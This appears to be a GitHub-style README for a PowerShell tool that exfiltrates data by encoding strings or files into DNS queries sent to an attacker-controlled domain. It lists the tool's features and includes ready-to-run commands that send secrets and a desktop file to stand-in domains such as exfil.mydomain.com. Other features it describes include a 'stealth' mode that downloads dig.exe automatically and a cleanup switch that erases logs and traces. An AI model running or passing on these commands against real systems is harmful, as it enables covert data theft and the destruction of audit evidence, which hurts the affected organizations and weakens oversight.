# Invoke-DNSExfiltration.ps1

## Overview
**Invoke-DNSExfiltration.ps1** is a PowerShell script for Windows 10/11/Server that enables exfiltration of data by encoding it into DNS queries sent to a controlled domain. The script supports chunked transfer, stealth operation (using dig.exe if present), logging, cleanup of traces, timing control, and file-to-base64 exfiltration. It can also auto-download `dig.exe` if needed.

## Features
- **Data Exfiltration via DNS:** Encodes and sends data (string or file) to your domain via DNS queries.
- **Chunking:** Splits data into safe-sized chunks for DNS queries.
- **Stealth Mode:** Uses `dig.exe` (if available or auto-downloaded) for more stealthy DNS queries.
- **Logging:** Logs all queries sent.
- **Cleanup:** Full trace/log cleanup with switch.
- **Timing Control:** Adjustable sleep between queries (default 150ms).
- **Test Mode:** Previews DNS queries without sending.
- **File Exfiltration:** Accepts file path, reads and encodes content for DNS exfiltration.
- **Verbose Output:** Switch for detailed progress info.

## Parameters
| Name       | Type    | Default                | Description                                                            |
|------------|---------|------------------------|------------------------------------------------------------------------|
| Data       | string  | ""                     | The raw string to exfiltrate.                                          |
| FilePath   | string  | ""                     | Path to file to exfiltrate (Base64 encoded).                           |
| Domain     | string  | "exfil.example.com"    | Controlled domain for DNS queries.                                     |
| ChunkSize  | int     | 60                     | Size (bytes) for each chunk/query.                                     |
| SleepMs    | int     | 150                    | Milliseconds to sleep between queries.                                 |
| Verbose    | switch  | Off                    | Print detailed output.                                                 |
| UseDig     | switch  | Off                    | Use dig.exe if present (auto-downloads if missing).                    |
| Cleanup    | switch  | Off                    | Cleans up logs/traces and exits.                                       |
| TestMode   | switch  | Off                    | Only prints DNS queries, does not send them.                           |

## Usage
### Exfiltrate a string
```powershell
.\Invoke-DNSExfiltration.ps1 -Data "MySecretData" -Domain "exfil.mydomain.com"
```

### Exfiltrate a file
```powershell
.\Invoke-DNSExfiltration.ps1 -FilePath "C:\Users\user\Desktop\secret.txt" -Domain "exfil.mydomain.com"
```

### Use stealth mode (dig.exe)
```powershell
.\Invoke-DNSExfiltration.ps1 -Data "MySecretData" -UseDig
```

### Test mode (no DNS requests sent)
```powershell
.\Invoke-DNSExfiltration.ps1 -Data "MySecretData" -TestMode
```

### Cleanup traces/logs
```powershell
.\Invoke-DNSExfiltration.ps1 -Cleanup
```

## Output Example
```
[INFO] 2025-07-29 18:23:00 :: DNS method used: nslookup
[EXFIL] 2025-07-29 18:23:00 :: Number of queries to send: 4
[STEP] 2025-07-29 18:23:01 :: Query: dGVzdC5leGZpbC5leGFtcGxlLmNvbQ
...
[SUCCESS] 2025-07-29 18:23:04 :: DNS exfiltration completed.
```

## Help & Documentation
```powershell
Get-Help .\Invoke-DNSExfiltration.ps1
man .\Invoke-DNSExfiltration.ps1
```

## Troubleshooting
- If `dig.exe` is missing, the script will download it automatically to the script directory.
- Run with `-Verbose` for more output details.
- Use `-TestMode` for dry-run/preview of DNS queries.
- Use `-Cleanup` to erase logs/traces.

## License
MIT License

Copyright (c) 2025 Miiraak

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
